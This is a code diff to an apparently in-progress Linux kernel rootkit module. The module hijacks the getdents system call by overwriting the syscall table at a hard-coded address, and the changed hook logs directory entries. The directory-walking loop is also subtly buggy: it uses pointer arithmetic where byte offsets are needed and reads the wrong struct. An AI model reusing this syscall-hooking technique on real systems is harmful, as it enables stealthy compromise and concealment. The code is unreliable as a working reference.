@@ -14,7 +14,7 @@
 
 struct linux_dirent {
     unsigned long  d_ino;     /* Inode number */
-    unsigned long  d_off;     /* Offset to next linux_dirent */
+    off_t  d_off;     /* Offset to next linux_dirent */
     unsigned short d_reclen;  /* Length of this linux_dirent */
     char           d_name[];  /* Filename (null-terminated) */
                         /* length is actually (d_reclen - 2 -
@@ -39,28 +39,28 @@ asmlinkage int (*real_getdents) (unsigned int, struct linux_dirent*, unsigned in
 asmlinkage int hijacked_getdents(unsigned int fd, struct linux_dirent *dirp, unsigned int count){
 	printk(KERN_INFO "hijacked call.\n");
 	
-	//the following commented code, when uncommented, does not compile.
-	unsigned long dino,doff;
-	unsigned short dreclen;
+	
+	//unsigned long dino,doff;
+	//unsigned short dreclen;
 	//char name[256];
 	char *name;
-	dino = (unsigned long)dirp->d_ino;
-	doff = (unsigned long)dirp->d_off;
-	dreclen = (unsigned short)dirp->d_reclen;
-	
-	//strcpy(name,dirp->d_name);
 	name = dirp->d_name;
-	//printk(KERN_INFO "d_ino:%lu\n",dino);
 
-	//printk(KERN_INFO "d_off:%lu\n",doff);
-	//printk(KERN_INFO "d_reclen:%u\n",dreclen);
-	//printk(KERN_INFO "d_name:%s\n",name);
+	int num_reads = real_getdents(fd, dirp, count);
+
+	struct linux_dirent *current_dirent;	
 	int i = 0;
-	for (i = 0; i < 1000; i++){
-		printk(KERN_INFO "i: %u value: %c\n",i, name[i]);
+	printk(KERN_INFO "num reads: %d\n",num_reads);
+
+	for (i = 0; i < num_reads; i+= dirp->d_reclen){
+		current_dirent = (struct linux_dirent*)(dirp + i);
+		int j = 0;
+		for (j = 0; j < 15; j++){
+			printk(KERN_INFO "%c\n",*((char *)(dirp+j)) );
+		}
+		printk(KERN_INFO "d_ino:%lu, d_reclen:%u, d_off:%lu, d_name: %s \n",dirp->d_ino,dirp->d_reclen,dirp->d_off,dirp->d_name);
 	}
-	//printk(KERN_INFO "\n");
-	return real_getdents(fd, dirp, count);
+	return num_reads;
 }
 
 
@@ -100,7 +100,7 @@ int init_module(void){
 	sys_call_table = (unsigned long*)0xc1688140;	
 	hijack_sys_call_table();	
 	
-	printk(KERN_INFO "Rootkit added.\n");
+	printk(KERN_INFO "Rootkit added.\n\n");
 	
 	return 0;
 }
